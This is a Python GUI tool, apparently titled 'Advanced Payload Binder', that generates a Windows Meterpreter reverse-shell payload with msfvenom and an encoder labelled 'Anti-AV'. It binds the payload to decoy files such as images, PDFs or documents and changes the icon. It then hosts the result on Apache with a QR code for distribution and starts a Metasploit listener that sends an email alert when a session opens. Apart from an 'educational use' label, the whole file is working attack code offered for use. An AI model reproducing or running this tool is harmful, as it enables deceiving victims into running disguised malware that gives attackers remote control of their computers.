import os
import shutil
import socket
import tkinter as tk
from tkinter import filedialog, messagebox
import qrcode
from PIL import Image, ImageTk
import json
import smtplib
from email.mime.text import MIMEText

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def select_file():
    path = filedialog.askopenfilename(title="Select File", filetypes=[("All Files", "*.*")])
    file_entry.delete(0, tk.END)
    file_entry.insert(0, path)

def select_icon():
    path = filedialog.askopenfilename(title="Select Icon File", filetypes=[("Icon Files", "*.ico")])
    icon_entry.delete(0, tk.END)
    icon_entry.insert(0, path)

def generate_payload():
    lhost = lhost_entry.get().strip()
    lport = lport_entry.get().strip()
    file_path = file_entry.get().strip()
    icon_path = icon_entry.get().strip()
    encoder = encoder_var.get()
    file_type = file_type_var.get()

    if not all([lhost, lport, file_path]):
        messagebox.showerror("Error", "LHOST, LPORT, and File are required!")
        return

    try:
        # Step 1: Generate encoded payload
        encoder_str = "-e x86/shikata_ga_nai -i 5" if encoder else ""
        payload_cmd = (
            f"msfvenom -p windows/meterpreter/reverse_tcp "
            f"LHOST={lhost} LPORT={lport} {encoder_str} "
            f"-f exe -o payload.exe"
        )
        os.system(payload_cmd)

        # Step 2: Copy selected file as stub
        shutil.copy(file_path, f"stub{file_type}")
        os.rename("payload.exe", "payload.bin")

        # Step 3: Bind file + payload
        os.system(f"copy /b stub{file_type}+payload.bin output{file_type}.exe")

        # Step 4: Change icon if provided
        if icon_path:
            os.system(f"wine rcedit.exe output{file_type}.exe --set-icon {icon_path}")

        # Step 5: Move to Apache server dir
        apache_path = f"/var/www/html/output{file_type}.exe"
        shutil.move(f"output{file_type}.exe", apache_path)

        # Step 6: Start Apache2
        os.system("sudo systemctl start apache2")

        # Step 7: Generate QR code
        payload_url = f"http://{lhost}/output{file_type}.exe"
        qr = qrcode.make(payload_url)
        qr.save("payload_qr.png")
        qr_img = Image.open("payload_qr.png")
        qr_img = qr_img.resize((200, 200))
        qr_photo = ImageTk.PhotoImage(qr_img)
        qr_label.config(image=qr_photo)
        qr_label.image = qr_photo

        messagebox.showinfo("Success", f"Payload hosted at:\n{payload_url}")

    except Exception as e:
        messagebox.showerror("Error", str(e))

def start_listener():
    lhost = lhost_entry.get().strip()
    lport = lport_entry.get().strip()

    if not all([lhost, lport]):
        messagebox.showerror("Error", "LHOST and LPORT required")
        return

    handler_script = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
    with open("handler.rc", "w") as f:
        f.write(handler_script)

    os.system("xterm -e 'msfconsole -r handler.rc' &")

    # Send email alert
    try:
        with open("email_config.json") as f:
            config = json.load(f)
        msg = MIMEText(f"Meterpreter session started on {lhost}:{lport}")
        msg["Subject"] = "Payload Alert"
        msg["From"] = config["sender_email"]
        msg["To"] = config["recipient_email"]

        server = smtplib.SMTP(config["smtp_server"], config["smtp_port"])
        server.starttls()
        server.login(config["sender_email"], config["sender_password"])
        server.send_message(msg)
        server.quit()
    except Exception as e:
        messagebox.showerror("Email Error", str(e))

# GUI
root = tk.Tk()
root.title("Advanced Payload Binder GUI")
root.geometry("500x600")

local_ip = get_local_ip()

tk.Label(root, text="LHOST (Auto-detected or edit manually):").pack()
lhost_entry = tk.Entry(root)
lhost_entry.insert(0, local_ip)
lhost_entry.pack()

tk.Label(root, text="LPORT (e.g. 4444):").pack()
lport_entry = tk.Entry(root)
lport_entry.insert(0, "4444")
lport_entry.pack()

tk.Label(root, text="Select File to Bind:").pack()
file_entry = tk.Entry(root, width=50)
file_entry.pack()
tk.Button(root, text="Browse", command=select_file).pack()

tk.Label(root, text="Select Icon File (.ico):").pack()
icon_entry = tk.Entry(root, width=50)
icon_entry.pack()
tk.Button(root, text="Browse", command=select_icon).pack()

tk.Label(root, text="Select File Type:").pack()
file_type_var = tk.StringVar(value=".jpg")
tk.OptionMenu(root, file_type_var, ".jpg", ".pdf", ".mp4", ".mp3", ".docx").pack()

encoder_var = tk.BooleanVar(value=True)
tk.Checkbutton(root, text="Use Shikata Ga Nai Encoder (Anti-AV)", variable=encoder_var).pack(pady=5)

tk.Button(root, text="Generate & Host Payload", command=generate_payload, bg="green", fg="white").pack(pady=10)
tk.Button(root, text="Start Listener", command=start_listener, bg="blue", fg="white").pack()

qr_label = tk.Label(root)
qr_label.pack(pady=10)

tk.Label(root, text="Payload hosted at: http://<LHOST>/output<file_type>.exe", fg="gray").pack(pady=5)
tk.Label(root, text="⚠ For Testing / Educational Use Only ⚠", fg="red").pack(side="bottom")

root.mainloop()
